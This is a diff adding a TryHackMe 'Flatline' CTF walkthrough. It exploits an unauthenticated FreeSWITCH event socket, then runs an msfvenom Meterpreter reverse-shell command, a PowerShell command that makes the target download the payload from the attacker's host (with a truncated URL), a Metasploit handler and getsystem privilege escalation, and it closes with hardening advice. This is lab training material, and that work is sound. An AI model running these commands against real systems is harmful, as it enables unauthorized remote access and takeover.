@@ -1,0 +1,114 @@
+# TryHackMe: Flatline Walkthrough 🔴
+
+**Author:** Kopano Moshega  
+**Target IP:** `10.114.136.10`  
+**Target OS:** Windows (Nekrotic Profile)  
+**Vulnerability Focus:** FreeSWITCH mod_event_socket Command Execution  
+
+---
+
+## 🔍 Phase 1: Reconnaissance & Enumeration
+
+An initial port scan was executed, explicitly bypassing the standard host pinging phase (`-Pn`) to reveal open ingress points:
+
+```bash
+nmap -Pn -sV 10.114.136.10
+```
+
+### Open Ports & Services:
+*   **Port 3389/tcp:** `ms-wbt-server` (Microsoft Terminal Services / Remote Desktop Protocol)
+*   **Port 8021/tcp:** `freeswitch-event` (FreeSWITCH mod_event_socket) — An open-source communication stack running an unauthenticated event socket engine, identifying a highly exploitable boundary vulnerability.
+
+---
+
+## 💣 Phase 2: Weaponization & Local Exploit Staging
+
+The local exploit database repository was queried using `searchsploit` to look for matching FreeSWITCH modules:
+
+```bash
+searchsploit freeswitch
+```
+*   **Selected Exploit:** FreeSWITCH 1.10.1 - Command Execution (Python)
+*   **Staging:** The code execution script was downloaded locally and renamed to `exploiter.py`.
+
+A preliminary command test was routed through the script to verify remote system interactivity:
+```bash
+python3 ./exploiter.py 10.114.136.10 "dir C:\\"
+```
+The application executed the argument query successfully, returning a standard directory tree array. A subsequent check confirmed that PowerShell was fully active on the target subsystem.
+
+---
+
+## 🚀 Phase 3: Payload Generation & Delivery
+
+To achieve stable Command and Control (C2) persistence, a reverse shell strategy was initialized using specialized online deployment structures (`revshells.com`).
+
+### 1. Payload Creation
+The attack machine's internal tunnel interface address was verified via `ifconfig` (`192.168.185.81`). An executable payload template was compiled using **MSFVenom**:
+
+```bash
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.185.81 LPORT=4444 -f exe -o reverseshell.exe
+```
+
+### 2. Staging the Stager (Delivery)
+An interactive HTTP web daemon was spawned locally using Python's core utilities to stage the binary file payload:
+```bash
+python -m http.server 8000
+```
+
+The previously discovered unauthenticated command vector (`exploiter.py`) was used to force the target system to reach back and fetch the compiled binary onto its storage space via a web requests script:
+```bash
+python3 exploiter.py 10.114.136.10 "powershell Invoke-WebRequest -URI http://192.168.185 -o C:\Users\Nekrotic\Desktop\payload3.exe"
+```
+
+---
+
+## ⚡ Phase 4: Gaining Initial Access & Privilege Escalation
+
+An explicit payload management handler was launched within Metasploit to catch the reverse network link connection:
+
+```msf
+msf > use multi/handler
+msf exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp
+msf exploit(multi/handler) > set LHOST 192.168.185.81
+msf exploit(multi/handler) > set LPORT 4444
+msf exploit(multi/handler) > exploit
+```
+
+The payload execution command was forced on the target terminal using `exploiter.py`. A fully operational Meterpreter interactive shell call was cleanly caught by the handler.
+
+### Local Privilege Escalation (PrivEsc)
+An enumeration check verified the user environment context as `Nekrotic`. To elevate access permissions smoothly to full infrastructure manager level, the native privilege token technique was invoked:
+
+```msf
+meterpreter > getsystem
+```
+*   **Result:** Named Pipe Impersonation (In Memory/Admin) successfully triggered.
+*   **Elevated Context:** `NT AUTHORITY\SYSTEM` (Full Authority Permissions).
+
+---
+
+## 🏴‍☠️ Phase 5: Action on Objectives & Flags (Redacted)
+
+*All actual flag text strings have been scrubbed to comply with TryHackMe's write-up policy.*
+
+Navigating inside `C:\Users\Nekrotic\Desktop\`, both system files were located and read:
+
+*   **User Flag:** `C:\Users\Nekrotic\Desktop\user.txt`  
+    *   *Value:* `THM{REDACTED_USER_FLATLINE_HASH}`
+*   **Root Flag:** `C:\Users\Nekrotic\Desktop\root.txt`  
+    *   *Value:* `THM{REDACTED_ROOT_FLATLINE_HASH}`
+
+---
+
+## 🛡️ Risk Assessment & Defensive Hardening
+
+### Identified Vulnerabilities:
+1.  **Unauthenticated Event Sockets (Critical Risk):** The FreeSWITCH service exposed an unauthenticated management port directly to the network interface, allowing arbitrary command interpretation.
+2.  **Unchecked PrivEsc Vectors (High Risk):** Standard local profiles lacked restrictive process isolation, allowing simple automated tools (`getsystem`) to assume structural system control without a password sequence.
+3.  **Unrestricted Network Ingress (Medium-High Risk):** Target file download permissions permitted code fetching from untrusted outside addresses.
+
+### Remediation Blueprint:
+*   **Bind & Authenticate Sockets:** Mandate strong password authentication strings on FreeSWITCH's `mod_event_socket` layer and restrict its listening scope exclusively to `127.0.0.1` unless specifically required.
+*   **Restructure Execution Rights:** Audit and harden local account system tokens (`SeImpersonatePrivilege` etc.) to mitigate standard named-pipe execution hijacks.
+*   **AppLocker or Execution Control:** Enforce rigid binaries execution control layouts (such as AppLocker profiles) to stop unknown external binaries from executing inside directory paths like `Desktop` or `Downloads`.
